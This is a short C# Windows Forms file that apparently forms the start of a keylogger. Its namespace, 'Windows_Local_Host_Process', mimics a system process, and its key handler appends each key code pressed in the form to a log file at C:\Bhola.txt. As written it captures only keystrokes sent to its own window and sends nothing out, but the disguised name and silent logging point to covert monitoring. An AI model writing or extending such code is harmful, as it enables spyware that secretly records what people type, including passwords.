using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.IO;

namespace Windows_Local_Host_Process
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        private void Form1_KeyUp(object sender, KeyEventArgs e)
        {
            //ListBox list1 = new ListBox();
            //list1.Items.Add(e.KeyCode);
            StreamWriter sw = new StreamWriter(@"C:\Bhola.txt", true);
            sw.Write(e.KeyCode);
            sw.Close();
        }
    }
}
